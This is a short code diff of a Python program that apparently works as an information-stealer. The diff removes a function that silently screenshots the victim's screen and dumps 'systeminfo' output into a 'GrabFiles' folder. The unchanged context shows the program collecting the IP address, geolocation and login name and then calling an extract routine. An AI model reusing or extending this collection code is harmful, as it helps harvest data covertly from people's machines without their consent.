@@ -35,24 +35,6 @@ try:
 except:
     pass
 
-def screenshot():
-    try:
-        screenshot_path = os.path.join(path_data, "GrabFiles", "screenshot.png")
-        screenshot_first = ImageGrab.grab()
-        screenshot_first.save(screenshot_path)
-    except Exception as e:
-        print(f"Error taking or saving screenshot: {e}")
-
-    try:
-        system_info_path = os.path.join(path_data, "GrabFiles", "System_INFO.txt")
-        command = subprocess.check_output("systeminfo", stdout=subprocess.PIPE)
-        output = command.decode()
-        formatted_output = output.replace("\r{os.linesep}", "{os.linesep}")
-        with open(system_info_path, "w") as file:
-            file.write(formatted_output)
-
-    except Exception as e:
-        print(f"Error capturing or saving system info: {e}")
 
 
 
@@ -688,7 +670,6 @@ async def main():
     ip, language = pcinfo()
     location, host, city, province, country = get_country(ip)
     name_file = os.getlogin()
-    screenshot()
     extract()
 
     current_time = datetime.now().strftime("%Hh%Mm%Ss-%d-%m-%Y")
